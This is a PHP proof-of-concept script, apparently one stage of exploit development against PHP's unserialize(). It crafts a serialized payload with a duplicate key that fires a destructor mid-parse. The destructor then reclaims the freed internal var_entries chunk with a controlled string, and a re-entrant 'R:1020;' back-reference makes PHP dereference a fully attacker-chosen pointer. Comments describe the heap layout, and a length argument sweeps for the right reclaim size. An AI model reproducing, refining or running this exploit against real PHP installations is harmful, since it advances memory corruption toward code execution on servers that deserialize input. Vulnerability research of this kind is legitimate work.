<?php
// vd3: M4 - CONTROLLED corruption. Reclaim the freed var_entries chunk
// (8160B -> 2 ZendMM pages) with a controlled zend_string, then the
// re-entrant unserialize('R:1020;') does var_access() through the
// reclaimed chunk:
//   used_slots @0  = string gc word (refcount|type_info) -> huge, != 1018
//   data[id]   @16+8*id -> string payload bytes -> FORGED zval*
// id=1 -> val[0..7] = 'BBBBBBBB' -> ZVAL_COPY(0x4242424242424242)
// -> dereference of a FULLY attacker-chosen address.
// Sweep string length to find the exact ZendMM same-page-count reclaim.
$LEN = (int)($argv[1] ?? 8159);
class D {
    public function __destruct() {
        $s = str_repeat('B', $GLOBALS['LEN']);   // reclaim attempt
        $r = @unserialize('R:1020;');            // forged zval* deref
        var_dump($r);
    }
}
$GLOBALS['LEN'] = $LEN;
$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:1:"D":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';
$r = unserialize($payload);
echo "outer ok=";
var_dump($r !== false);
echo "SURVIVED len=$LEN\n";
